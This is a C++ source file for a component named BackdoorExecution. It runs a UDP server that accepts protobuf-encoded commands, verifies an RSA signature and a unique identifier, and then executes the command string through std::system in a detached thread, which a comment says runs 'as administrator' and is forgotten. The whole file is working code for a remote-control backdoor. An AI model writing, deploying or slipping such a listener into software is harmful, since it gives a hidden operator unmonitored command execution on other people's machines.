#include "BackdoorExecution.hpp"

#include <iostream>
#include <memory>
#include <cstdlib>
#include <thread>

#include <UdpServer.hpp>
#include <rsa_cpp/rsa.hpp>
#include <rsa_cpp/sha512.hpp>
#include <messages.pb.h>
#include <CommandHash.hpp>

void BackdoorExecution::Serve(volatile std::sig_atomic_t& stop, std::uint16_t port, const PublicKey_t& public_key)
{
    m_public_key = std::move(public_key);
    UdpServer::Serve(stop, port);
}

void BackdoorExecution::OnReceivedPacket(std::span<const std::uint8_t> command_bytes)
{
    // Parse the command as a "VerifiedCommand"
    VerifiedCommand verified_command;
    if (!verified_command.ParseFromArray(command_bytes.data(), static_cast<int>(command_bytes.size())))
    {
        LogError("Failed to parse the command_bytes as a ProtoBuf VerifiedCommand");
        return;
    }
    const boost::multiprecision::cpp_int message_hash = hash(verified_command.command());
    const auto string_to_span = [](const std::string& str) { return std::span<const uint8_t>(reinterpret_cast<const uint8_t*>(str.data()), str.size()); };
    const boost::multiprecision::cpp_int signature = to_cpp_int(string_to_span(verified_command.signature()));
    if (!cryptb::rsa::is_valid_signature(message_hash, signature, m_public_key.e, m_public_key.N))
    {
        LogError("The signature is not valid");
        return;
    }

    const std::string& identifier = verified_command.command().unique_identifier();
    if (m_database_of_unique_identifiers.insert(identifier).second == false)
    {
        LogError("The identifier is not unique");
        return;
    }
    // Execute the command as administrator and then forget about it
    std::thread([command = verified_command.command()]() -> void {
            // TODO: command.command() is a utf-8 encoded std::string.
            //       I think that std::system() expects only ASCII characters.
            std::system(command.command().c_str());
        }).detach();
}

void BackdoorExecution::LogError(std::string_view sv)
{
    std::cout << sv << std::endl;
}

BackdoorExecution::BackdoorExecution() = default;
BackdoorExecution::~BackdoorExecution() = default;
